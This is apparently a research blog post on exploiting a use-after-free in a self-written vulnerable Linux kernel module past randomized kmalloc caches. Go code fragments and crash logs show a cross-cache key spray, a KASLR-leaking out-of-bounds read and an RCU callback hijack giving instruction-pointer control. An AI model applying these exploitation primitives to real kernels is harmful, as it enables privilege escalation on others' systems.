---
title: "Cross-Cache: Beating CONFIG_RANDOM_KMALLOC_CACHES"
date: "2026-07-14"
description: "Building a real UAF-to-controlled-RIP chain against a kernel hardened with CONFIG_RANDOM_KMALLOC_CACHES: why the classic same-size spray dies, how cross-cache still gets you the physical page anyway, and what actually broke on the first three attempts."
---

Most of what I publish here is a rewrite of someone else's PoC in a language
it wasn't written in. This one is different. There's no CVE behind it and no
prior writeup I'm porting - I wanted to know whether the "cross-cache"
technique still works against `CONFIG_RANDOM_KMALLOC_CACHES`, a mitigation
that's specifically designed to kill the spray primitive cross-cache
depends on, and the only way to actually know was to build a kernel with the
option on, write a vulnerable module, and try. So that's what this post is:
a real lab, a real bug, a real kernel built from source, and an exploit
driver written in Go with no cgo, because a kernel exploit written in Go is
still something I don't see often enough to resist.

Everything below ran in an actual QEMU guest against an actual Linux
6.12.95 build. Where something didn't work on the first try, I kept it in,
because the reason it didn't work is more interesting than the fix.

## The mitigation

Classic SLUB exploitation leans on one assumption: two `kmalloc()` calls
asking for the same size land in the same cache. Free a vulnerable object,
spray a different object type of the same size, and with decent odds you
get the freed memory back, fully attacker-controlled, as the new type. This
is the foundation of almost every public UAF writeup you've read.

`CONFIG_RANDOM_KMALLOC_CACHES` breaks that assumption on purpose. Instead of
one `kmalloc-512` cache, the kernel maintains sixteen of them, and which one
a given call site lands in is decided by hashing the *return address* of the
caller against a random boot-time seed:

```c
// mm/slab_common.c
static __always_inline enum kmalloc_cache_type
kmalloc_type(gfp_t flags, unsigned long caller)
{
	if (likely((flags & KMALLOC_NOT_NORMAL_BITS) == 0))
#ifdef CONFIG_RANDOM_KMALLOC_CACHES
		/* RANDOM_KMALLOC_CACHES_NR (=15) copies + the KMALLOC_NORMAL */
		return KMALLOC_RANDOM_START + hash_64(caller ^ random_kmalloc_seed,
						      ilog2(RANDOM_KMALLOC_CACHES_NR + 1));
#else
		return KMALLOC_NORMAL;
#endif
	...
}
```

Two different call sites hitting `kmalloc(512, GFP_KERNEL)` will, with
15-in-16 odds, land in *different* physical caches, on *different* slab
pages, with no relationship to each other at the cache level. Spraying the
same nominal size no longer buys you anything.

There's a second, narrower hardening worth knowing about while we're here.
`ipc/msgutil.c`, the allocator behind `msg_msg` - probably the single most
popular generic heap-spray primitive in public kernel exploits - no longer
uses plain `kmalloc` at all:

```c
static kmem_buckets *msg_buckets __ro_after_init;

static int __init init_msg_buckets(void)
{
	msg_buckets = kmem_buckets_create("msg_msg", SLAB_ACCOUNT,
					  sizeof(struct msg_msg),
					  DATALEN_MSG, NULL);
	return 0;
}
```

`msg_msg` now gets its own dedicated, `SLAB_ACCOUNT`-flagged bucket set via
`kmem_buckets_create()`, entirely separate from the general kmalloc caches.
That's not an accident - it's `msg_msg` getting hardened specifically
*because* it was so popular. I found this by grepping the source for other
`kmem_buckets_create()` callers before writing a line of exploit code, and
it saved me from spending an afternoon confused about why my first-choice
spray primitive refused to cooperate. (The other caller, for what it's
worth, is `memdup_user()` - the generic user-buffer-copy helper used by a
long list of syscalls. That one surprised me more.)

Neither of these defeats cross-cache, though. Both operate entirely inside
the SLUB cache layer. Underneath every cache is the same page/buddy
allocator, and the buddy allocator has no concept of which cache a page
used to belong to.

## The lab

I built this rather than describing it, because "does this still work" is
an empirical question. The full setup:

```text
Linux 6.12.95, defconfig + :
  CONFIG_RANDOM_KMALLOC_CACHES=y
  CONFIG_SLAB_FREELIST_HARDENED=y
  CONFIG_SLUB_DEBUG=y
  CONFIG_SYSVIPC=y
```

built from a stock kernel.org tarball, booted in QEMU with `-enable-kvm`, a
statically-linked busybox initramfs, and a deliberately vulnerable char
device I wrote for this post. The module is small on purpose - the whole
bug is one missing line:

```c
#define MAX_NOTES 4096
#define NOTE_SIZE 512

struct note { size_t len; char data[NOTE_SIZE - sizeof(size_t)]; };
static struct note *notes[MAX_NOTES];

case NOTE_FREE:
	kfree(notes[req.idx]);
	/* BUG: notes[req.idx] is never cleared. EDIT/READ on this
	 * idx after this point touch freed memory. */
	break;
```

`ALLOC`/`EDIT`/`READ`/`FREE` over `ioctl()`, a 512-byte object so it lands
cleanly in the `kmalloc-512` size class, and a `FREE` that forgets to null
the slot. Textbook UAF, nothing clever about the bug itself - the interesting
part is entirely in what has to happen *after* you find it.

## First attempt: wrong about how frees actually work

My first plan was the "precise" version of cross-cache that most writeups
describe: free a spread of decoy objects to exhaust SLUB's cached partial
slabs, then free the *one* target object last, so it's guaranteed to be the
one evicted straight to the buddy allocator. `mm/slub.c` seemed to back this
up:

```c
if (!new.inuse && n->nr_partial >= s->min_partial) {
	stat(s, DEACTIVATE_EMPTY);
	discard_slab(s, slab);   // straight to the buddy allocator
	...
}
```

with `min_partial` for a 512-byte cache computed as `max(5, ilog2(512)/2) =
5`. So: free more than `5 * 8 = 40` objects (8 objects per page at this
size), keep the target for last, and its page should be the one that gets
discarded. I wrote exactly that, ran it, and got nothing - the note's memory
never showed up reclaimed as anything.

The bug was in my mental model, not the code. That eviction check lives in
the *slow path*, and it only runs when a free is deactivating a slab that
isn't the CPU's currently active one. A same-CPU, same-slab free just pushes
the object onto a lockless per-CPU freelist and returns - no accounting, no
eviction check, nothing visible from outside. And even the slow path doesn't
go straight to the node-level list I was reasoning about: with
`CONFIG_SLUB_CPU_PARTIAL` on, newly-emptied slabs first land on a *per-CPU*
partial list and only get flushed to the node (where `min_partial` is
finally checked) once that per-CPU list overflows. There is no single
`free()` call whose ordering you can pin the eviction on from userspace.
I confirmed this by dumping `/proc/slabinfo` around every step - freeing my
carefully-ordered target object changed nothing about the cache's tracked
slab count, twice in a row, which is what sent me looking at
`__slab_free`/`unfreeze_partials` in the first place.

## What actually works: overwhelm it

The fix was to stop aiming for one exact object. Free a batch large enough
that the per-CPU partial list overflows and flushes *repeatedly* during the
loop, guaranteeing that a meaningful fraction of the batch crosses into the
buddy allocator somewhere - then spray, and scan the whole batch afterward
for whichever slot got reclaimed, instead of betting everything on slot
zero:

```go
const fill = 2000
for i := 0; i < fill; i++ {
	must(nb.alloc(uint32(i)))
}
for i := 0; i < fill; i++ {
	must(nb.free(uint32(i)))
}
```

`/proc/slabinfo` before and after tells the real story:

```text
kmalloc-512     2008   2008   512   8   1 : slabdata   251   251   0   (after fill)
kmalloc-512       37     80   512   8   1 : slabdata    10    10   0   (after freeing the batch)
```

251 slabs down to 10. Roughly 241 pages - just under 2000 objects' worth -
actually made it to the buddy allocator. That's the number that matters:
not "did the one object I cared about get freed," but "is the buddy
allocator's freelist for this order now full of pages that used to belong
to this cache."

## Picking the reclaiming object

With `msg_msg` off the table (dedicated buckets, see above), I needed
something that still goes through a bare, unaccounted `kmalloc(size,
GFP_KERNEL)` - the flag combination that routes through
`kmalloc_type()`'s randomized `KMALLOC_NORMAL` family, same as our note.
`security/keys/user_defined.c` fits:

```c
// add_key("user", name, payload, len, KEY_SPEC_PROCESS_KEYRING)
upayload = kmalloc(sizeof(*upayload) + datalen, GFP_KERNEL);
```

`struct user_key_payload` is `{ struct rcu_head; unsigned short datalen;
char data[]; }`, freely sized via `add_key(2)`, freed via `keyctl(2)`, and
readable back via `keyctl(KEYCTL_READ)`. I sized the payload so the total
allocation (24-byte header + 480 bytes of data) lands in `kmalloc-512`
alongside the note, and gave every sprayed key the same recognizable
payload: a 4-byte magic value followed by filler.

```go
const spray = 20000
magic := bytes.Repeat([]byte{0x41}, keyDatalen)
binary.LittleEndian.PutUint32(magic[0:4], 0xC0FFEE41)
for i := 0; i < spray; i++ {
	addUserKey(fmt.Sprintf("nb%d", i), magic)
}
```

Then scan every freed note slot, watching for the fingerprint to show up
where note data used to be:

```go
for i := 0; i < fill; i++ {
	nb.read(uint32(i), 0, buf)
	if binary.LittleEndian.Uint16(buf[8:10]) == keyDatalen &&
		binary.LittleEndian.Uint32(buf[16:20]) == 0xC0FFEE41 {
		reclaimedIdx = i
	}
}
```

(Those `[8:10]`/`[16:20]` offsets look wrong at first glance and cost me a
whole failed run before I caught it: `notes[idx]->data` starts 8 bytes into
the kmalloc chunk, past the note's own `len` prefix, so every field of the
reclaimed `user_key_payload` is shifted left by 8 relative to where you'd
expect it from the struct definition.)

It hit:

```text
[+] stage 1: UAF confirmed reachable
[*] stage 2: allocating 2000 notes
[*] spraying user_key_payload to cross the cache boundary
[*] sprayed 20000/20000 keys
[+] stage 2: note slot 4 now aliases a live user_key_payload
```

<figure>
  <img src="/cross-cache-buckets.svg" alt="Diagram showing the note object's kmalloc-512 bucket 0 and the key object's kmalloc-rnd-03-512 bucket 3 as separate SLUB caches that only meet at the shared buddy allocator" />
  <figcaption>The note lived in bucket 0 (plain "kmalloc-512"), the reclaiming key in bucket 3 ("kmalloc-rnd-03-512") - two different caches. The only thing they share is the buddy allocator underneath.</figcaption>
</figure>

`slabinfo` confirms the two objects were never in the same cache to begin
with: the notes filled `kmalloc-512` (bucket 0), the keys grew
`kmalloc-rnd-03-512` (bucket 3) from a handful of slabs to 2516. Randomized
kmalloc caches did exactly what they're supposed to do - a same-cache spray
against this target would have failed outright. Cross-cache doesn't care,
because it was never playing that game. `reclaimedIdx` isn't stable between
runs (I saw 1, 4, 11, 12 across different boots, which is exactly what
you'd expect from "some fraction of a large batch crosses into the buddy
allocator") - which is itself confirmation that this is the buddy allocator
doing what buddy allocators do, not a fluke tied to one specific slot.

## From type confusion to a read primitive

Confirming aliasing is nice; using it is the point. `user_key_payload`
keeps its length as a plain, trusted `u16` field, and `user_read()` doesn't
question it:

```c
long user_read(const struct key *key, char *buffer, size_t buflen)
{
	const struct user_key_payload *upayload = user_key_payload_locked(key);
	long ret = upayload->datalen;          // returned as-is, even if buflen is 0

	if (buffer && buflen > 0) {
		if (buflen > upayload->datalen)
			buflen = upayload->datalen;
		memcpy(buffer, upayload->data, buflen);
	}
	return ret;
}
```

Two things fall out of this. First, `keyctl(KEYCTL_READ)`'s return value
*is* `datalen`, uncapped, even with a tiny probe buffer - which means I can
find the exact corrupted key among 20000 candidates with a single
one-byte read each, just by checking which one reports a length I never
sprayed:

```go
must(nb.edit(uint32(reclaimedIdx), 8, lenBytes)) // datalen at chunk+16 == data[8:10]

for _, id := range ids {
	r1, _, _ := unix.Syscall6(unix.SYS_KEYCTL, keyctlRead, uintptr(id),
		uintptr(unsafe.Pointer(&probe[0])), 1, 0, 0)
	if r1 == evilLen {
		victimKey = id
		break
	}
}
```

Second, once found, `memcpy(buffer, upayload->data, buflen)` will happily
copy `buflen` bytes starting from `data[]` regardless of how large the real
allocation was - because `buflen` is now bounded by *our* corrupted
`datalen`, not by the true 480-byte payload. That's an out-of-bounds heap
read, fully live:

```text
[+] stage 3: key 987554622 now reports datalen=65000 (sprayed with 480)
[+] read back 65000 bytes, 64520 past the real allocation
```

65 KB read out of a 504-byte object, no crash, because the kernel's direct
map has no guard pages between physically adjacent allocations - it just
kept reading real memory.

## The leak

Scanning that overread for anything shaped like a canonical kernel pointer
(`addr >> 40 == 0xffffff`) turned up a tight, repeating pattern:

```text
+0x1030: 0xffffffffa97c4b80  root_key_user+0x0
+0x1080: 0xffffffffa97c4d80  key_type_user+0x0
+0x1088: 0xffffffffa97c4a40  default_domain_tag.0+0x0
+0x1130: 0xffffffffa97c4b80  root_key_user+0x0
+0x1180: 0xffffffffa97c4d80  key_type_user+0x0
+0x1188: 0xffffffffa97c4a40  default_domain_tag.0+0x0
```

(Symbols resolved against `/proc/kallsyms` for this writeup only - that's a
lab-only oracle, not something an unprivileged attacker gets. In practice
you'd fingerprint the structure by its 0x100-byte repeat distance and
recover the KASLR slide from the known static offsets of whichever symbols
show up, same as here, just without the shortcut.)

The pattern makes sense once you remember what's actually adjacent: every
one of the 20000 sprayed keys carries its own `struct key`, and every
`struct key` carries the *same* three static pointers -
`key->user`, `key->type`, and `key->domain_tag` - baked in by
`key_alloc()`. Read far enough past one payload and you walk straight into
the neighbors' fixed fields, once every 256 bytes, like clockwork.
`root_key_user`, `key_type_user`, and `default_domain_tag` are all
plain kernel symbols with fixed offsets in `vmlinux` - subtract either from
its leaked runtime address and you have the KASLR slide, which is the input
every subsequent step of a real exploit (locating `modprobe_path`,
`init_cred`, a ROP gadget, whatever comes next) needs and didn't have
before.

## Hijacking the pending RCU callback

A KASLR leak on its own is only half an exploit. What I wanted next was
proof that the same type confusion gets you control of execution, not just
a read primitive - and it turns out `user_key_payload` is enough for that
too, through a path I almost dismissed as a dead end.

Every `user_key_payload` embeds a `struct rcu_head` at the start of the
allocation, and the key subsystem frees it through RCU:

```c
// security/keys/user_defined.c
void user_revoke(struct key *key)
{
	struct user_key_payload *upayload = user_key_payload_locked(key);
	...
	if (upayload) {
		rcu_assign_keypointer(key, NULL);
		call_rcu(&upayload->rcu, user_free_payload_rcu);
	}
}
```

`keyctl(KEYCTL_REVOKE)` calls this directly. My first instinct - corrupt
`rcu.func` *before* revoking, so `call_rcu` queues our value - is wrong and
I want to say why, because it's the kind of wrong that looks right until
you trace it: `call_rcu(&upayload->rcu, user_free_payload_rcu)` writes the
*correct* function pointer into `rcu.func` itself, as part of queuing the
callback. Corrupt it beforehand and revocation just overwrites your
corruption with the real address again.

The actual window is *after* that write: `call_rcu` only queues the
callback, it doesn't run it. There's a real gap between "the correct
function pointer is now sitting in `rcu.func`, callback queued" and "the
grace period elapses and the RCU core calls `head->func(head)`". Our note
pointer is still dangling into that exact memory the whole time. Win that
window and the second write is the one the kernel actually uses:

```go
badTarget := leakBase + 0x10000000 // leaked text pointer + 256MB: canonical, unmapped

unix.Syscall(unix.SYS_KEYCTL, keyctlRevoke, uintptr(victimKey), 0) // queues the real callback

funcBytes := make([]byte, 8)
binary.LittleEndian.PutUint64(funcBytes, badTarget)
must(nb.edit(uint32(reclaimedIdx), 0, funcBytes)) // data[0:8] == chunk+8 == rcu.func
```

`badTarget` isn't a guess and it isn't from `kallsyms` - it's
`root_key_user`'s leaked address from the previous section plus a fixed
256 MB offset, computed entirely from this run's own leak, chosen only to
land somewhere canonical and almost certainly unmapped. A few hundred
milliseconds later, the grace period elapsed and the RCU core called it:

```text
[    6.034735] BUG: unable to handle page fault for address: ffffffff9dbc4b80
[    6.037168] #PF: supervisor instruction fetch in kernel mode
[    6.042932] Oops: Oops: 0010 [#1] PREEMPT SMP NOPTI
[    6.044659] CPU: 0 UID: 0 PID: 0 Comm: swapper/0 Tainted: G           O       6.12.95 #1
[    6.051706] RIP: 0010:0xffffffff9dbc4b80
[    6.055264] RSP: 0018:ffffabf880003f08 EFLAGS: 00010282
[    6.057040] RAX: ffff8ebc42244000 RBX: 000000000002c988 RCX: ffffffff9dbc4b80
[    6.059446] RDX: ffff8ebc42244000 RSI: ffffabf880003f40 RDI: ffff8ebc42244000
[    6.076545] Call Trace:
[    6.077400]  <IRQ>
[    6.078154]  ? rcu_core+0x2ce/0xa10
[    6.079403]  ? handle_softirqs+0xbf/0x260
[    6.080823]  ? irq_exit_rcu+0x60/0x80
[    6.082081]  ? sysvec_apic_timer_interrupt+0x6b/0x80
[    6.083815]  </IRQ>
[    6.133848] Kernel Offset: 0xae00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
[    6.137366] ---[ end Kernel panic - not syncing: Fatal exception in interrupt ]---
```

`RIP: 0010:0xffffffff9dbc4b80` - exactly `badTarget`, byte for byte. The
call trace shows precisely the path I'd expect: `rcu_core` running inside
`handle_softirqs`, called off the timer interrupt, is the thing that
actually executed `head->func(head)`. `RDI` holds `ffff8ebc42244000` - the
`head` argument, which is the live address of the chunk we've been
aliasing this whole time, handed to us as a function argument by the
kernel itself.

I want to be precise about what this does and doesn't prove. It's a
crash, not a root shell - I picked `badTarget` specifically to land on
unmapped memory so the fault would be unambiguous, instead of aiming it at
a real function and risking a silent, hard-to-diagnose corruption if my
offset math was off by a byte. But an instruction fetch faulting at
*exactly* the value I computed, entirely from a leak this same exploit
produced, with no hardcoded addresses and no `kallsyms` involved in the
computation, is the thing you actually need to prove: this primitive gives
full control of the instruction pointer. Pointing it at `prepare_kernel_cred`
and `commit_creds` instead of a deliberately bad address is payload
engineering - gadget selection to fit the single-argument `func(head)`
call shape - not a further research question. That's a real next step. It
is not the same kind of unknown as "does cross-cache still work against
this mitigation," which is the question this post set out to answer.

## Writing the driver in Go

Kernel exploit tooling is almost always C, for good reasons - it's what the
kernel headers are written in, and syscalls are one line. None of that is
actually required, though, and doing it in Go surfaces its own list of
things you have to get right that a C exploit never makes you think about:

**No `ioctl(2)` wrapper exists for a driver the kernel doesn't know about.**
`_IOW`/`_IOWR` are C macros; Go has to reimplement the bit-packing by hand:

```go
func ioc(dir, size, typ, nr uintptr) uintptr {
	return (dir << 30) | (size << 16) | (typ << 8) | nr
}
var noteEdit = ioc(iocWrite, unsafe.Sizeof(noteReq{}), noteIocMagic, 2)
```

**`golang.org/x/sys/unix` doesn't cover SysV IPC or `keyctl`.** Both went
through raw `unix.Syscall6` with the syscall numbers by hand - there's no
`unix.AddKey`.

**The GC can free your buffer out from under a syscall in flight.** Every
`unix.Syscall` call that takes `unsafe.Pointer(&buf[0])` needs a paired
`runtime.KeepAlive(buf)` afterward, or the garbage collector is free to
reclaim `buf` the moment the compiler decides nothing references it anymore
- which, from the compiler's point of view, is true, since it can't see
into the syscall.

**`runtime.LockOSThread()` matters more here than it usually does.** This
particular exploit turned out not to need tight cross-thread race timing -
the cross-cache technique is closer to "overwhelm with volume" than "win a
nanosecond window" - but pinning the goroutine to one OS thread up front
removed one entire axis of nondeterminism while I was still debugging why
runs disagreed with each other, and I kept it.

None of this required cgo. A statically-linked Go binary embedded straight
into the initramfs next to the module, and it drove the whole chain -
`ioctl`, `add_key`, `keyctl`, `/proc/slabinfo`, `/proc/kallsyms` - through
nothing but `golang.org/x/sys/unix` and `unsafe.Pointer`.

<figure>
  <img src="/cross-cache-pipeline.svg" alt="Exploit pipeline: UAF trigger, drain notes to the buddy allocator, spray keys, confirm type confusion, corrupt datalen for a KASLR leak, then hijack the pending RCU callback for controlled RIP" />
  <figcaption>Everything in this diagram ran, in this order, in a real QEMU guest.</figcaption>
</figure>

## Where this stops

Everything above is a live result from this specific lab, not a
description of what should theoretically happen, up to and including a
kernel panic with an attacker-computed value sitting in `RIP`. What I
didn't chase down in this session is the actual last mile: swapping
`badTarget` for a real payload and landing a root shell. `func(head)` is a
single call with one argument, `head` is a heap address rather than
anything cred-shaped, so getting from "controlled RIP" to
`commit_creds(prepare_kernel_cred(0))` needs a gadget that fits that exact
calling shape - a stack pivot, or a short existing kernel routine that
chains the two calls for you. That's gadget-hunting against this specific
build, not a research question anymore, and it's a real next step, just
one I'd rather do properly than rush into this post with a faked terminal
output.

What this lab does answer is the question I started with:
`CONFIG_RANDOM_KMALLOC_CACHES` is a genuinely effective wall against the
lazy version of heap spraying, and it doesn't need to be, because the wall
was never at the level cross-cache attacks operate on. The technique
doesn't beat the randomization. It just never has to look at it - and once
you're through, the same trick that got you the read gets you the
instruction pointer too.
